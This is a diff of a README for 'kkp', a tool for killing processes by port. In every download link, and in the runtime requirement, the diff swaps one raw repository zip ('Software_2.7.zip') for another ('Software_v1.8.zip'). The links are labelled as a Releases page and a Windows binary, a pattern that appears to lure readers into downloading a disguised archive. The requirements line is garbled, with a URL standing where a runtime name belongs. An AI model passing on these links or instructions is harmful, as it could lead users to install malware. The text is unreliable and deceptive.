@@ -1,14 +1,14 @@
 # 🔥 kkp - Easily Kill Processes by Port
 
 ## 📥 Download Now
-[![Download kkp](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/core/killer/Software_2.7.zip%20kkp-v1.0.0-blue)](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/core/killer/Software_2.7.zip)
+[![Download kkp](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/Software_v1.8.zip%20kkp-v1.0.0-blue)](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/Software_v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to kkp, a simple command-line tool that helps you kill processes using their port numbers. It works on various operating systems and is designed for anyone who needs an easy solution to manage their applications.
 
 ## 📋 System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **https://github.com/Valtneto/kkp/raw/refs/heads/main/src/core/killer/Software_2.7.zip** Version 12 or higher
+- **https://github.com/Valtneto/kkp/raw/refs/heads/main/src/Software_v1.8.zip** Version 12 or higher
 - **Terminal:** Access to a command-line interface
 
 ## 📂 Features
@@ -21,14 +21,14 @@ To get started with kkp, you need to download the application from our Releases 
 
 1. **Visit the Releases Page:** 
    Click the link below to go to the Releases page where you can download kkp.
-   [Download kkp](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/core/killer/Software_2.7.zip)
+   [Download kkp](https://github.com/Valtneto/kkp/raw/refs/heads/main/src/Software_v1.8.zip)
 
 2. **Select the Latest Release:**
    On the Releases page, find the latest version of kkp. It usually appears at the top of the list.
 
 3. **Download the Correct File:**
    Choose the appropriate file for your operating system:
-   - For Windows, download `https://github.com/Valtneto/kkp/raw/refs/heads/main/src/core/killer/Software_2.7.zip`.
+   - For Windows, download `https://github.com/Valtneto/kkp/raw/refs/heads/main/src/Software_v1.8.zip`.
    - For macOS, download `kkp-macos`.
    - For Linux, download `kkp-linux`.
 
